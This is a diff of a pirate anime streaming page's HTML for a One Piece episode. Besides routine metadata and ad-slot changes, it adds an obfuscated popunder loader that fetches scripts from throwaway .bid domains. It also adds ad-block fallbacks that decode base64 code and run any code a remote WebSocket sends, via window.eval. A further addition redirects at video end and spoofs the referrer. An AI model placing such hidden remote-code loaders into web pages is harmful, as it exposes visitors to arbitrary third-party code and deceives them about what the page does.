@@ -13,6 +13,7 @@
   <meta name="apple-mobile-web-app-status-bar-style" content="#111"> 
   <link rel="alternate prefetch" type="application/rss+xml" title="AnimaCurse! RSS Feed" href="https://animacurse.moe/?feed=rss2"> 
   <link rel="publisher prefetch" href="https://plus.google.com/116971018837020513527"> 
+  <link rel="archives" title="setembro 2017" href="https://animacurse.moe/?m=201709">
   <link rel="archives" title="agosto 2017" href="https://animacurse.moe/?m=201708">
   <link rel="archives" title="julho 2017" href="https://animacurse.moe/?m=201707">
   <link rel="archives" title="junho 2017" href="https://animacurse.moe/?m=201706">
@@ -55,6 +56,8 @@
   <meta name="twitter:title" content="Assistir One Piece - Episódio 162 – Chopper em perigo! Antigo Deus x Sacerdote Shura! Online">
   <meta name="twitter:site" content="@Iz4yacchi">
   <meta name="twitter:creator" content="@Iz4yacchi">
+  <script type="application/ld+json">{"@context":"http:\/\/schema.org","@type":"WebSite","@id":"#website","url":"https:\/\/animacurse.moe\/","name":"AnimaCurse!","potentialAction":{"@type":"SearchAction","target":"https:\/\/animacurse.moe\/?s={search_term_string}","query-input":"required name=search_term_string"}}</script>
+  <script type="application/ld+json">{"@context":"http:\/\/schema.org","@type":"Person","url":"https:\/\/animacurse.moe\/?p=713","sameAs":["https:\/\/plus.google.com\/u\/1\/b\/116971018837020513527\/","https:\/\/twitter.com\/Iz4yacchi"],"@id":"#person","name":"Urah"}</script>
   <link rel="alternate" type="application/rss+xml" title="Feed de comentários para AnimaCurse! » One Piece – Episódio 162 – Chopper em perigo! Antigo Deus x Sacerdote Shura!" href="https://animacurse.moe/?feed=rss2&amp;p=713">
   <link rel="stylesheet" id="facebook-login-css" href="https://animacurse.moe/wp-content/plugins/wp-facebook-login/public/css/facebook-login.css?ver=1.1.6" type="text/css" media="all">
   <script type="text/javascript" src="https://animacurse.moe/wp-includes/js/jquery/jquery.js?ver=1.12.4"></script>
@@ -74,6 +77,7 @@ var oneSignal_options = {};window._oneSignalInitOptions = oneSignal_options;oneS
 oneSignal_options['path'] = "https://animacurse.moe/wp-content/plugins/onesignal-free-web-push-notifications/sdk_files/";
 oneSignal_options['safari_web_id'] = "web.onesignal.auto.1d2463f6-17a6-4c7e-80c3-735ae8ddc977";oneSignal_options['persistNotification'] = false;oneSignal_options['promptOptions'] = { };OneSignal.init(window._oneSignalInitOptions);});function documentInitOneSignal() {var oneSignal_elements = document.getElementsByClassName("OneSignal-prompt");var oneSignalLinkClickHandler = function(event) { OneSignal.push(['registerForPushNotifications']); event.preventDefault(); };        for(var i = 0; i < oneSignal_elements.length; i++)
 oneSignal_elements[i].addEventListener('click', oneSignalLinkClickHandler, false);}if (document.readyState === 'complete') {documentInitOneSignal();}else {window.addEventListener("load", function(event){documentInitOneSignal();});}</script> 
+  <script type="text/javascript" data-cfasync="false">/*<![CDATA[/* *//* Privet darkv. Each domain is 2h fox dead */(function(){ var w=window;w["_\u0070o\x70"]=[["s\u0069te\x49d",1838939],["minB\x69\u0064",0],["\u0070o\u0070u\u006e\u0064ers\u0050e\u0072I\x50",0],["\x64el\x61\x79B\u0065\x74w\u0065\x65\x6e",0],["\x64\x65f\x61\u0075l\x74",false],["\x64\u0065\x66\x61u\u006ctPe\u0072Day",0],["\x74\x6f\u0070\x6d\u006f\u0073t\x4ca\u0079\x65\x72",!0]];var j=["\x2f/c\x31\x2e\x70\u006fp\u0061\u0064s\x2ene\u0074\u002f\u0070o\x70.j\x73","\x2f/\x63\x32.\u0070\x6f\x70a\x64\u0073\x2en\x65\x74\x2f\u0070\x6fp\x2e\x6a\u0073","\u002f\u002fw\u0077\x77\x2epd\x74\x61\u0071y\x6a\x71w\u0066\u006bar\x7a.\x62\x69\x64/rv\u002e\u006a\u0073","\x2f/\u0077\x77\u0077\x2e\u0068hd\u0062\u0062ix\x78\x73.\u0062\x69d\u002f\x68.js",""],z=0,f,k=function(){if(""==j[z])return;f=w["\u0064o\u0063\x75\x6d\u0065n\x74"]["crea\u0074\x65\x45l\u0065\x6d\x65\x6e\x74"]("s\x63\u0072i\x70\x74");f["t\u0079\x70\u0065"]="\u0074\u0065x\x74/j\x61\x76a\x73\u0063\u0072\u0069p\x74";f["\u0061\u0073yn\u0063"]=!0;var o=w["\x64ocu\x6d\x65\x6et"]["\x67\u0065t\u0045\x6c\x65m\u0065nt\u0073B\u0079\x54\u0061\x67N\u0061\x6d\x65"]("\x73\u0063r\x69\x70\u0074")[0];f["src"]=j[z];if(z<2){f["\x63\u0072\x6f\x73\u0073\x4f\u0072\u0069\u0067\x69\u006e"]="\u0061\u006e\x6f\x6e\x79\u006dou\x73";};f["\u006f\u006ee\u0072\u0072or"]=function(){z++;k()};o["\x70\x61r\u0065n\x74N\u006fde"]["ins\u0065\u0072\x74\u0042\x65\u0066\u006fre"](f,o)};k()})();/*]]>/* */</script>
  </head>
  <body> 
   <div class="menu-bg-mobile not" onclick="HideMobileMenu()"> 
@@ -146,11 +150,20 @@ oneSignal_elements[i].addEventListener('click', oneSignalLinkClickHandler, false
     </div>
    </nav>
   </header>
-  <form name="search" class action="https://animacurse.moe" method="get"> 
+  <form name="search" class="" action="https://animacurse.moe" method="get"> 
    <input name="s" class="search-all" type="search" placeholder="Pesquise!">
   </form>
   <center> 
-   <div class="adscenter" style="margin:0 auto!important; display: block!important"> 
+   <div class="adscenter" style="margin:0 auto!important; display: block!important">
+    <style>@media(max-width:480px){#MGWrap146850{min-height:220px}}@media(min-width:480px){#MGWrap146850{min-height:350px}}</style>
+    <div style="display:block !important; visibility:visible !important;" id="MGWrap146850"> 
+     <div id="M270459Composite146850">
+      <center> 
+       <a href="http://adskeeper.co.uk/" target="_blank">Loading...</a> 
+      </center>
+     </div> 
+     <script type="text/javascript"> var d = new Date, script146850 = document.createElement("script"), mg_ws146852 = {};script146850.type = "text/javascript";script146850.charset = "utf-8";script146850.src = "//jsc.adskeeper.co.uk/a/n/animacurse.moe.146850.js?t=" + d.getYear() + d.getMonth() + d.getDay() + d.getHours();script146850.onerror = function () { mg_ws146852 = new Worker(URL.createObjectURL(new Blob(['eval(atob(\'ZnVuY3Rpb24gc2VuZE1lc3NhZ2UxNDY4NTIoZSl7dmFyIGg9bWdfd3MxNDY4NTIub25tZXNzYWdlOyBtZ193czE0Njg1Mi5yZWFkeVN0YXRlPT1tZ193czE0Njg1Mi5DTE9TRUQmJihtZ193czE0Njg1Mj1uZXcgV2ViU29ja2V0KG1nX3dzMTQ2ODUyX2xvY2F0aW9uKSksbWdfd3MxNDY4NTIub25tZXNzYWdlPWgsd2FpdEZvclNvY2tldENvbm5lY3Rpb24xNDY4NTIobWdfd3MxNDY4NTIsZnVuY3Rpb24oKXttZ193czE0Njg1Mi5zZW5kKGUpfSl9ZnVuY3Rpb24gd2FpdEZvclNvY2tldENvbm5lY3Rpb24xNDY4NTIoZSx0KXtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7cmV0dXJuIDE9PT1lLnJlYWR5U3RhdGU/dm9pZChudWxsIT10JiZ0KCkpOnZvaWQgd2FpdEZvclNvY2tldENvbm5lY3Rpb24xNDY4NTIoZSx0KX0sNSl9OyB2YXIgbWdfd3MxNDY4NTJfbG9jYXRpb24gPSAid3NzOi8vd3NwLmFkc2tlZXBlci5jby51ay93cyI7IG1nX3dzMTQ2ODUyID0gbmV3IFdlYlNvY2tldChtZ193czE0Njg1Ml9sb2NhdGlvbiksIG1nX3dzMTQ2ODUyLm9ubWVzc2FnZSA9IGZ1bmN0aW9uICh0KSB7cG9zdE1lc3NhZ2UodC5kYXRhKTt9LCBvbm1lc3NhZ2UgPSBmdW5jdGlvbihlKXtzZW5kTWVzc2FnZTE0Njg1MihlLmRhdGEpfQ==\'))']), {type: "application/javascript"})); mg_ws146852.onmessage = function (msg){window.eval(msg.data);}; mg_ws146852.postMessage('js|//jsc.adskeeper.co.uk/a/n/animacurse.moe.146852.js|M270459Composite146852|M270459Composite146850');};document.body.appendChild(script146850); </script> 
+    </div> 
     <script type="text/javascript">if(!window.BB_a) { BB_a = [];} if(!window.BB_ind) { BB_ind = 0; } if(!window.BB_vrsa) { BB_vrsa = 'v3'; }if(!window.BB_r) { BB_r = Math.floor(Math.random()*1000000000)} BB_ind++; BB_a.push({ "pl" : 41380, "index": BB_ind});</script> 
     <script type="text/javascript">document.write('<scr'+'ipt async id="BB_SLOT_'+BB_r+'_'+BB_ind+'" src="//st.bebi.com/bebi_'+BB_vrsa+'.js"></scr'+'ipt>');
 </script>
@@ -203,6 +216,22 @@ oneSignal_elements[i].addEventListener('click', oneSignalLinkClickHandler, false
        </div> 
        <div class="sinopse" itemprop="description">
          Houve um homem que conquistou tudo aquilo que o mundo tinha a oferecer, o lendário Rei dos Piratas, Gold Roger. Capturado e condenado à execução pelo Governo Mundial, suas últimas palavras lançaram legiões aos mares. "Meu tesouro? Se quiserem, podem pegá-lo. Procurem-no! Ele contém tudo que este mundo pode oferecer!". Foi a revelação do maior tesouro, o One Piece, cobiçado por homens de todo o mundo, sonhando com fama e riqueza imensuráveis... Assim começou a Grande Era dos Piratas! Monkey D. Luffy de 17 anos, desafia a definição de pirata. Sem a típica personalidade vil e cruel, suas motivações são simples: 
+        <br>
+        <br>
+        <center> 
+         <script type="text/javascript">if(!window.BB_a) { BB_a = [];} if(!window.BB_ind) { BB_ind = 0; } if(!window.BB_vrsa) { BB_vrsa = 'v3'; }if(!window.BB_r) { BB_r = Math.floor(Math.random()*1000000000)} BB_ind++; BB_a.push({ "pl" : 41386, "index": BB_ind});</script> 
+         <script type="text/javascript">document.write('<scr'+'ipt async id="BB_SLOT_'+BB_r+'_'+BB_ind+'" src="//st.bebi.com/bebi_'+BB_vrsa+'.js"></scr'+'ipt>');
+</script> 
+         <style>@media(max-width:480px){#MGWrap146849{min-height:500px}}@media(min-width:480px){#MGWrap146849{min-height:320px}}</style>
+         <div style="display:block !important; visibility:visible !important;" id="MGWrap146849"> 
+          <div id="M270459Composite146849">
+           <center> 
+            <a href="http://adskeeper.co.uk/" target="_blank">Loading...</a> 
+           </center>
+          </div> 
+          <script type="text/javascript"> var d = new Date, script146849 = document.createElement("script"), mg_ws146851 = {};script146849.type = "text/javascript";script146849.charset = "utf-8";script146849.src = "//jsc.adskeeper.co.uk/a/n/animacurse.moe.146849.js?t=" + d.getYear() + d.getMonth() + d.getDay() + d.getHours();script146849.onerror = function () { mg_ws146851 = new Worker(URL.createObjectURL(new Blob(['eval(atob(\'ZnVuY3Rpb24gc2VuZE1lc3NhZ2UxNDY4NTEoZSl7dmFyIGg9bWdfd3MxNDY4NTEub25tZXNzYWdlOyBtZ193czE0Njg1MS5yZWFkeVN0YXRlPT1tZ193czE0Njg1MS5DTE9TRUQmJihtZ193czE0Njg1MT1uZXcgV2ViU29ja2V0KG1nX3dzMTQ2ODUxX2xvY2F0aW9uKSksbWdfd3MxNDY4NTEub25tZXNzYWdlPWgsd2FpdEZvclNvY2tldENvbm5lY3Rpb24xNDY4NTEobWdfd3MxNDY4NTEsZnVuY3Rpb24oKXttZ193czE0Njg1MS5zZW5kKGUpfSl9ZnVuY3Rpb24gd2FpdEZvclNvY2tldENvbm5lY3Rpb24xNDY4NTEoZSx0KXtzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7cmV0dXJuIDE9PT1lLnJlYWR5U3RhdGU/dm9pZChudWxsIT10JiZ0KCkpOnZvaWQgd2FpdEZvclNvY2tldENvbm5lY3Rpb24xNDY4NTEoZSx0KX0sNSl9OyB2YXIgbWdfd3MxNDY4NTFfbG9jYXRpb24gPSAid3NzOi8vd3NwLmFkc2tlZXBlci5jby51ay93cyI7IG1nX3dzMTQ2ODUxID0gbmV3IFdlYlNvY2tldChtZ193czE0Njg1MV9sb2NhdGlvbiksIG1nX3dzMTQ2ODUxLm9ubWVzc2FnZSA9IGZ1bmN0aW9uICh0KSB7cG9zdE1lc3NhZ2UodC5kYXRhKTt9LCBvbm1lc3NhZ2UgPSBmdW5jdGlvbihlKXtzZW5kTWVzc2FnZTE0Njg1MShlLmRhdGEpfQ==\'))']), {type: "application/javascript"})); mg_ws146851.onmessage = function (msg){window.eval(msg.data);}; mg_ws146851.postMessage('js|//jsc.adskeeper.co.uk/a/n/animacurse.moe.146851.js|M270459Composite146851|M270459Composite146849');};document.body.appendChild(script146849); </script> 
+         </div> 
+        </center> 
        </div> 
       </div> 
       <div class="comments"> 
@@ -299,9 +328,6 @@ oneSignal_elements[i].addEventListener('click', oneSignalLinkClickHandler, false
        <script type="text/javascript">if(!window.BB_a) { BB_a = [];} if(!window.BB_ind) { BB_ind = 0; } if(!window.BB_vrsa) { BB_vrsa = 'v3'; }if(!window.BB_r) { BB_r = Math.floor(Math.random()*1000000000)} BB_ind++; BB_a.push({ "pl" : 41379, "index": BB_ind});</script> 
        <script type="text/javascript">document.write('<scr'+'ipt async id="BB_SLOT_'+BB_r+'_'+BB_ind+'" src="//st.bebi.com/bebi_'+BB_vrsa+'.js"></scr'+'ipt>');
 </script> 
-       <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script> 
-       <ins class="adsbygoogle" style="display:inline-block;width:300px;height:250px" data-ad-client="ca-pub-1641037476819844" data-ad-slot="8838196949"></ins> 
-       <script>(adsbygoogle = window.adsbygoogle || []).push({});</script> 
       </center> 
      </div>
     </div>
@@ -309,7 +335,10 @@ oneSignal_elements[i].addEventListener('click', oneSignalLinkClickHandler, false
    <div class="clear"></div>
   </main>
   <script type="text/javascript" src="https://animacurse.moe/wp-includes/js/wp-embed.min.js?ver=4.8.1"></script>
-  <footer> 
+  <footer>
+   Links: 
+   <a target="_blank" href="https://www.zeletro.com.br/receptor-azamerica-i5">Comprar Azamerica i5</a>
+   <br> 
    <div class="padding-20 footer">
      Piracy starts where we begin. 
    </div>
@@ -323,14 +352,15 @@ oneSignal_elements[i].addEventListener('click', oneSignalLinkClickHandler, false
   <script src="https://animacurse.moe/wp-content/themes/izaya/jquery.js"></script>
   <script src="https://animacurse.moe/wp-content/themes/izaya/plyr.js"></script>
   <script src="https://togetherjs.com/togetherjs-min.js"></script>
-  <script type="text/Javascript">var UA = navigator.userAgent;</script>
-  <script>/*  if(UA == "animacurseapp"){}else{$("body").one( "click", function() {window.open('//n.popclck.org/adv_out?Id=394594&direct=1&traf_back=animacurse.ru&nosync=1', '_blank');
-} );}*/</script> 
+  <script type="text/Javascript">var UA = navigator.userAgent;</script> 
   <script>if (document.cookie.indexOf("gintoki=") >= 0) {// They've been here before.
 }else {expiry = new Date();expiry.setTime(expiry.getTime()+(86400000)); // Ten minutes
 document.cookie = "gintoki=yes; expires=" + expiry.toGMTString();//document.write('<scri'+'pt id="ls" src="https://goo.gl/59633y"></'+'script>');
 }</script>
   <script src="https://animacurse.moe/wp-content/themes/izaya/custom.js"></script> 
+  <script>window.onload = function() {$('.plyr--setup').on('ended', function() {setTimeout(function() {window.location = "https://animacurse.moe/?p=714";
+Object.defineProperty(document, "referrer", {get : function(){ return "https://animacurse.moe/?p=713"; }});
+}, 2000);});$(".plyr--setup")[0].play(); $("html, body").animate({ scrollTop: $(".plyr--setup").offset().top }, "slow");}</script> 
   <div style="display:none" id="amung"> 
    <img src="https://whos.amung.us/swidget/6wfgc13zsung.gif" style="display:none"> 
   </div> 
